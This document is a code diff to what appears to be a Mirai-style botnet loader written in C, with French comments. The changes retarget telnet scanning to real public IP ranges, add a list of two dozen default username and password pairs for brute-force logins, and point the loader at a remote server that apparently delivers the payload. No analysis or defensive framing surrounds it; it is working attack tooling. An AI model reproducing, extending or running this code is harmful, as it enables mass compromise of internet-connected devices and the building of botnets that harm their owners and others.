@@ -56,7 +56,7 @@ void auto_scan_lab(void)
     for (int i = 1; i <= 254; i++)
     {
         char strbuf[128];
-        snprintf(strbuf, sizeof(strbuf), "13.51.157.%d:23 root:root", i);
+        snprintf(strbuf, sizeof(strbuf), "16.171.64.%d:23 root:root", i); 
         
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) != NULL)
@@ -113,8 +113,38 @@ void auto_scan_random(void)
     uint32_t total = 0;
     int max_scans = 1000;
     
+    // Liste des credentials à tester
+    char *credentials[] = {
+        "root:root",
+        "root:admin",
+        "root:12345",
+        "root:password",
+        "root:toor",
+        "admin:admin",
+        "admin:password",
+        "admin:12345",
+        "root:default",
+        "admin:default",
+        "user:user",
+        "user:password",
+        "root:123456",
+        "root:abc123",
+        "administrator:administrator",
+        "admin:1234",
+        "root:letmein",
+        "admin:letmein",
+        "root:master",
+        "admin:master",
+        "support:support",
+        "tech:tech",
+        "admin:root",
+        "root:changeme",
+        // Ajoutez plus ici
+    };
+    int cred_count = sizeof(credentials) / sizeof(credentials[0]);
+    
     srand(time(NULL));
-    printf("Generating %d random IPs in 16.171.x.x\n\n", max_scans);
+    printf("Generating %d random IPs in 16.171.x.x\n\n", max_scans); 
     
     for (int i = 0; i < max_scans; i++)
     {
@@ -122,14 +152,18 @@ void auto_scan_random(void)
         uint8_t o3 = rand() % 256;
         uint8_t o4 = (rand() % 254) + 1;
         
-        snprintf(strbuf, sizeof(strbuf), "13.51.157.%d:23 root:root", o4);
+        // Sélectionner un credential aléatoire
+        int cred_index = rand() % cred_count;
+        
+        snprintf(strbuf, sizeof(strbuf), "16.171.64.%d:23 %s", o4, credentials[cred_index]);
         
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) != NULL)
         {
             server_queue_telnet(srv, &info);
             total++;
-            printf("[%4d] Queued: 16.171.%d.%d\n", total, o3, o4);
+            printf("[%4d] Queued: 16.171.64.%d:%d with %s\n", 
+                   total, o3, o4, credentials[cred_index]);
             usleep(20000);
         }
     }
@@ -162,7 +196,7 @@ int main(int argc, char **args)
     }
 
     if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 
-                              1024 * 64, "13.60.69.47", 80, "13.60.69.47")) == NULL)
+                              1024 * 64, "13.48.105.223", 80, "13.48.105.223")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
